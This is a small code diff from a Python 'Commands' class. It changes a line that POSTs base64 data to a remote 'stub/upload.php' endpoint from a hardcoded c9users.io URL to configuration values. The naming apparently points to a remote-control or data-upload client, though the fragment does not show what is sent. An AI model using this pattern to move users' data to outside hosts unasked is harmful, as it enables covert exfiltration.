@@ -81,7 +81,7 @@ class Commands():
         sleep(0.50)
         print(data)
         userdata = {'base64_str': data}
-        resp = requests.post('http://myremote-bermdingetje.c9users.io/stub/upload.php', data=userdata)
+        resp = requests.post('%s%s'% (cfg.P_BASE, cfg.P_UPLOAD), data=userdata)
         print(resp.status_code)
         print('send')
 
